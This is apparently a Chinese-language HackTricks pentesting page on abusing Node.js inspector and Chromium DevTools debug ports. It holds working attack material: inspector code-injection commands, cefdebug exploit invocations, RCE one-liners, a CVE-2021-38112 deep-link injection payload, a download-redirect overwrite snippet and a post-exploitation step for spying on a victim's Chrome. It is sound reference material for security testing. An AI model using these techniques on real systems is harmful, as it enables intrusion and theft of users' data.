# Node inspector/CEF debug abuse

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}

## 基本信息

[来自文档](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started)：当使用 `--inspect` 开关启动时，Node.js 进程会监听调试客户端。**默认情况下**，它将在主机和端口 **`127.0.0.1:9229`** 上监听。每个进程还会分配一个 **唯一** 的 **UUID**。

调试客户端必须知道并指定主机地址、端口和 UUID 以进行连接。完整的 URL 看起来像 `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`。

{% hint style="warning" %}
由于 **调试器对 Node.js 执行环境具有完全访问权限**，能够连接到此端口的恶意行为者可能能够代表 Node.js 进程执行任意代码（**潜在的权限提升**）。
{% endhint %}

有几种方法可以启动调试器：
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
当你启动一个被检查的进程时，类似这样的内容将会出现：
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
基于 **CEF** (**Chromium Embedded Framework**) 的进程需要使用参数: `--remote-debugging-port=9222` 来打开 **debugger**（SSRF 保护仍然非常相似）。然而，它们 **而不是** 授予 **NodeJS** **debug** 会话，而是使用 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 与浏览器进行通信，这是一个控制浏览器的接口，但没有直接的 RCE。

当你启动一个调试的浏览器时，类似这样的内容将会出现：
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### 浏览器、WebSockets 和同源策略 <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

在网页浏览器中打开的网站可以在浏览器安全模型下进行 WebSocket 和 HTTP 请求。**初始 HTTP 连接**是**获取唯一调试器会话 ID**所必需的。**同源策略****防止**网站能够进行**此 HTTP 连接**。为了进一步防止 [**DNS 重新绑定攻击**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** Node.js 验证连接的**'Host' 头**是否精确指定了**IP 地址**或**`localhost`**或**`localhost6`**。

{% hint style="info" %}
此**安全措施防止利用检查器**通过**仅发送 HTTP 请求**（这可能通过利用 SSRF 漏洞来实现）来运行代码。
{% endhint %}

### 在运行进程中启动检查器

您可以向正在运行的 nodejs 进程发送**信号 SIGUSR1**以使其**在默认端口启动检查器**。但是，请注意，您需要拥有足够的权限，因此这可能会授予您**对进程内部信息的特权访问**，但不会直接导致特权升级。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
这在容器中很有用，因为**关闭进程并启动一个新的进程**使用`--inspect`**不是一个选项**，因为**容器**将会**被杀死**与进程一起。
{% endhint %}

### 连接到检查器/调试器

要连接到**基于Chromium的浏览器**，可以访问Chrome或Edge的`chrome://inspect`或`edge://inspect` URL。通过点击配置按钮，应该确保**目标主机和端口**正确列出。图像显示了一个远程代码执行（RCE）示例：

![](<../../.gitbook/assets/image (674).png>)

使用**命令行**，您可以通过以下方式连接到调试器/检查器：
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
该工具 [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) 允许 **查找** 本地运行的 inspectors 并 **注入代码** 到它们中。
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
注意，**NodeJS RCE 漏洞将无法工作**，如果通过 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 连接到浏览器（您需要检查 API 以找到有趣的事情来做）。
{% endhint %}

## NodeJS 调试器/检查器中的 RCE

{% hint style="info" %}
如果您来这里是想了解如何从 Electron 中的 [**XSS 获取 RCE，请查看此页面。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

一些常见的方法来获得 **RCE** 当您可以 **连接** 到 Node **检查器** 时是使用类似的东西（看起来这 **在连接到 Chrome DevTools 协议时将无法工作**）：
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol Payloads

您可以在此处查看 API: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
在本节中，我将列出我发现人们用来利用此协议的有趣内容。

### 通过深层链接进行参数注入

在 [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) 中，Rhino 安全发现基于 CEF 的应用程序 **在系统中注册了一个自定义 URI** (workspaces://)，该 URI 接收完整的 URI，然后 **使用部分构造的配置启动 CEF 基础应用程序**。

发现 URI 参数被 URL 解码并用于启动 CEF 基础应用程序，允许用户在 **命令行** 中 **注入** 标志 **`--gpu-launcher`** 并执行任意操作。

因此，像这样的有效载荷:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
将执行 calc.exe。

### 覆盖文件

更改 **下载文件将要保存的文件夹**，并下载一个文件以 **覆盖** 应用程序中经常使用的 **源代码**，用你的 **恶意代码** 替换。
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE 和外泄

根据这篇文章：[https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)，可以获得 RCE 并从 theriver 中外泄内部页面。

### 后期利用

在真实环境中，**在攻陷**使用 Chrome/Chromium 浏览器的用户 PC 后，您可以启动一个 Chrome 进程，**激活调试并转发调试端口**，以便您可以访问它。这样，您将能够**检查受害者在 Chrome 中所做的一切并窃取敏感信息**。

隐秘的方法是**终止每个 Chrome 进程**，然后调用类似于
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## 参考文献

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **在 Twitter 上关注** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}
